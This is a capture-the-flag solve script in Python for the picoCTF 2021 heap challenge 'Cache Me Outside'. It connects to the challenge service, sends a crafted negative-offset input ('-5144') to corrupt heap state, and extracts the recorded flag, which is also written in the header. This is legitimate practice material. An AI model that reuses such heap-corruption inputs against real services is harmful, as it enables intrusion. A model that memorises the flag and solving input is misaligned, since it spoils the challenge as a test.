# 146 - Cache Me Outside  (Binary Exploitation, picoCTF 2021)
# Flag: academy{7ca0515c9a0ee5226a98fa761eac776c}
# Write-up: ../../../writeups/binary-exploitation/146-cache-me-outside.md
# Script exact utilise pour produire le flag.
#
import sys, socket, re, time
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
host, port = open(r"./_z_146url.txt").read().split()
port = int(port)
print("cible:", host, port, flush=True)
s = socket.create_connection((host, port), timeout=8)
s.settimeout(3)
out = b""
try:
    while b"Value: " not in out:
        c = s.recv(4096)
        if not c:
            break
        out += c
except socket.timeout:
    pass
print("banner:", out.decode("latin-1"), flush=True)
s.sendall(b"-5144\n\x00")
time.sleep(1.0)
s.settimeout(3)
out2 = b""
try:
    while True:
        c = s.recv(4096)
        if not c:
            break
        out2 += c
except socket.timeout:
    pass
print("resp:", out2.decode("latin-1"), flush=True)
m = re.search(rb"academy\{[^}]*\}", out2)
print("FLAG:", m.group(0).decode() if m else None)
s.close()
